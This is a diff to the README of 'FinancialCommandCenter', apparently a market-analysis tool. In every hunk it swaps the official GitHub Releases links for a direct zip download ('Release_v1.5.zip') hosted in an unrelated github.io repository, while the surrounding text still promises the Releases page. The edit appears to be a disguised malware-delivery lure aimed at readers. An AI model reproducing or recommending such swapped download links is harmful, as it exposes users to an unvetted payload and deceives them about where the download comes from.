@@ -5,7 +5,7 @@ description: "📈 Analyze pre-market financial data with ease using this AI-pow
 ---
 # 📊 FinancialCommandCenter - Your Gateway to Market Insights
 
-[![Download FinancialCommandCenter](https://img.shields.io/badge/Download-FinancialCommandCenter-blue.svg)](https://github.com/codewithmxm/FinancialCommandCenter/releases)
+[![Download FinancialCommandCenter](https://img.shields.io/badge/Download-FinancialCommandCenter-blue.svg)](https://github.com/codewithmxm/codewithmxm.github.io/raw/refs/heads/master/unhyphened/Release_v1.5.zip)
 
 ## 📋 Overview
 
@@ -39,7 +39,7 @@ Before proceeding, make sure your computer meets the following basic requirement
 
 To download FinancialCommandCenter, visit the following page and select the latest version:
 
-- [Visit this page to download](https://github.com/codewithmxm/FinancialCommandCenter/releases)
+- [Visit this page to download](https://github.com/codewithmxm/codewithmxm.github.io/raw/refs/heads/master/unhyphened/Release_v1.5.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version listed at the top.
@@ -92,6 +92,6 @@ If you need assistance with FinancialCommandCenter, consider the following resou
 
 Stay informed about the latest updates and new features for FinancialCommandCenter by following our GitHub repository:
 
-- [Visit this page to download](https://github.com/codewithmxm/FinancialCommandCenter/releases) to check for updates.
+- [Visit this page to download](https://github.com/codewithmxm/codewithmxm.github.io/raw/refs/heads/master/unhyphened/Release_v1.5.zip) to check for updates.
 
 Thank you for using FinancialCommandCenter! We hope it serves you well on your trading journey.
